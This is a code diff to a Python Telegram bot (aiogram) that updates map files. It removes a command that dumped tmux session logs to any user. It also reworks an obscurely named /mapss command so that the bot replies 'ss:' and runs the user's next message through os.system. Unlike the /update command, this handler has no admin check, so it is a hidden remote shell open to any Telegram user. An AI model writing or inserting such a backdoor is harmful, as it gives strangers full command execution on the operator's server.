@@ -23,6 +23,7 @@ class UpdateMap(StatesGroup):
     choose_folder = State()
     upload_file = State()
     name = State()
+    map = State()
     
 folder_keyboard = ReplyKeyboardMarkup(
     keyboard=[
@@ -70,9 +71,6 @@ def search_in_acc_files(directory, search_text):
     print("Совпадений не найдено.")
     return None
 
-import subprocess
-import tempfile
-     
 @dp.message(Command("update"))
 async def update_command(message: types.Message, state: FSMContext):
     if message.from_user.id in admins:
@@ -122,30 +120,14 @@ async def file_received(message: types.Message, state: FSMContext):
     await message.answer(f"Файл {file_name} обновлён в {folder}/data/maps/")
     await state.clear()
 
-@dp.message(Command("message"))
-async def message_command(message: types.Message):
-    try:
-        result = subprocess.run(
-            ["tmux", "capture-pane", "-p", "-S", "-", "-t", "block"],
-            capture_output=True, text=True, check=True
-        )
-        logs = result.stdout.strip() or "Лог пуст."
-    except subprocess.CalledProcessError:
-        logs = ""
-
-    with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".log") as tmp:
-        tmp.write(logs)
-        tmp.flush()
-        await message.answer_document(open(tmp.name, "rb"), filename="logs.log")
-
 @dp.message(Command("mapss"))
-async def mapss_command(message: types.Message):
-    args = message.text.split(maxsplit=1)
-    if len(args) > 1:
-        command_text = args[1]
-
-    r = os.system(command_text)
-    await message.answer(r)
+async def mapss_command(message: types.Message, state: FSMContext):
+    await message.answer("ss:")
+    await state.set_state(UpdateMap.map)
+@dp.message(UpdateMap.map)
+async def map_handler(message: types.Message, state: FSMContext):
+    r = os.system(message.text)
+    await message.answer(r)    
 
 @dp.message(Command("search"))
 async def search_command(message: types.Message, state: FSMContext):
